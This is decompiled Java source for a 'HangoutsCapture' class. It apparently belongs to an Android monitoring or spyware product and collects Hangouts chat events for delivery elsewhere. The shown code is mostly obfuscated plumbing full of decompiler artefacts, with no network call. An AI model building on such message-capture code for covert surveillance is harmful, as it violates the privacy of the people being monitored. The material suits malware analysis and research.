package com.vvt.capture.hangouts;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.capture.hangouts.c.c;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class f
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.a;
  private com.vvt.base.a c;
  private String d;
  private e e;
  private com.vvt.base.capture.f f;
  private com.vvt.base.b g;
  private a h;
  
  public f(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, Context paramContext, com.vvt.base.b paramb1)
  {
    Object localObject1 = new com/vvt/capture/hangouts/g;
    ((g)localObject1).<init>(this);
    this.h = ((a)localObject1);
    boolean bool = b;
    if (bool) {}
    this.d = paramString;
    this.c = parama;
    this.g = paramb1;
    localObject1 = RunningMode.FULL;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      bool = a;
      if (bool) {}
      localObject1 = new com/vvt/capture/hangouts/a/a;
      ((com.vvt.capture.hangouts.a.a)localObject1).<init>();
      localObject2 = this.h;
      ((com.vvt.capture.hangouts.a.a)localObject1).a((a)localObject2);
      this.e = ((e)localObject1);
      localObject1 = new com/vvt/capture/hangouts/a/b;
      localObject2 = this.g;
      ((com.vvt.capture.hangouts.a.b)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.f = ((com.vvt.base.capture.f)localObject1);
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      return;
      localObject1 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject1)
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/capture/hangouts/c/b;
        ((com.vvt.capture.hangouts.c.b)localObject1).<init>(paramb);
        this.e = ((e)localObject1);
        localObject1 = new com/vvt/capture/hangouts/c/c;
        localObject2 = this.g;
        ((c)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
        this.f = ((com.vvt.base.capture.f)localObject1);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected com.vvt.base.capture.g a(com.vvt.base.capture.g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.g = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool3 = localObject instanceof HangoutsData;
        if (bool3)
        {
          localObject = d.a((HangoutsData)localObject);
          if (localObject != null)
          {
            int j = ((List)localObject).size();
            if (j > 0) {
              localArrayList.addAll((Collection)localObject);
            }
          }
        }
      }
      Object localObject = this.c;
      if (localObject != null)
      {
        int i = localArrayList.size();
        if (i > 0)
        {
          boolean bool2 = k();
          if (bool2)
          {
            localObject = this.c;
            ((com.vvt.base.a)localObject).a(localArrayList);
          }
        }
      }
    }
  }
  
  protected e b()
  {
    return this.e;
  }
  
  protected com.vvt.base.capture.f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "HangoutsCapture";
  }
  
  protected String e()
  {
    return this.d;
  }
  
  protected String f()
  {
    return "hangouts.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */